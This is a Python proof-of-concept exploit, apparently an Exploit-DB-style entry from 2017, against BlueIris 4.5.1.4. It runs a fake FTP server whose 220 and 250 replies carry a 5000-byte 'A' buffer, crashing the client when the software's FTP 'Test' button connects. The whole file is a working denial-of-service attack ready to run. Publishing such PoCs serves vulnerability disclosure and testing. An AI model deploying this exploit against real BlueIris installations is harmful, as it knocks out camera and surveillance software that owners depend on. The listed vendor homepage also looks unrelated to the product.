import socket


# Title: BlueIris - Denial of Service
# Date: 2017-02-28
# Exploit Author: Peter Baris
# Vendor Homepage: http://www.saptech-erp.com.au
# Software Link: http://blueirissoftware.com/blueiris.exe
# Version: 4.5.1.4
# Tested on: Windows Server 2008 R2 Standard x64


# Start this fake FTP server and create an FTP connection in the software. Use the "Test" button to trigger the vulnerability.

buffer = "A"*5000
port = 21
s = socket.socket()
ip = '0.0.0.0'             
s.bind((ip, port))            
s.listen(5)                    

 
print 'Listening on FTP port: '+str(port)
 
while True:
	conn, addr = s.accept()     
	conn.send('220 '+buffer+'\r\n')
	conn.recv(1024)
	conn.send('250 '+buffer+'\r\n')
	conn.close()